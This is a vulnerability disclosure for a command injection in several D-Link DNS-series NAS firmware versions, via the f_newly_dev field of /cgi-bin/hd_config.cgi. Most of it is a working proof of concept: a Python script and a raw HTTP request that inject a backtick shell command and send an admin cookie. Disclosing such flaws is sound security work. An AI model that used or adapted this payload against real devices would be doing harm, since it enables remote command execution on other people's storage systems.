# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_FMT_Std2R1_DiskMGR function of the file /cgi-bin/hd_config.cgi.  The variable `f_newly_dev`is passed from a POST request and is assigned to `v3` via the `sprintf` function at line 20 and invoked by the `system` command, it can lead to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723735858024-e22790c1-bdd7-4218-92c1-fc2fa17b69c3.png#averageHue=%23fbfbf8&clientId=u003f8b5d-5f3a-4&from=paste&height=266&id=ue9ea7411&originHeight=266&originWidth=1101&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50975&status=done&style=none&taskId=u9f346f56-1fa0-421f-b318-ef88bb2cb0e&title=&width=1101)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/hd_config.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_FMT_Std2R1_DiskMGR&f_volume_name=1&f_newly_dev=`touch+/tmp/128`&f_file_system=1&f_source_dev=1&f_auto_sync=1"
response = requests.post(url, headers=headers, data=data)
print(response.text)
```

```
POST /cgi-bin/hd_config.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 70
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_FMT_Std2R1_DiskMGR&f_volume_name=1&f_newly_dev=`touch+/tmp/128`&f_file_system=1&f_source_dev=1&f_auto_sync=1
```

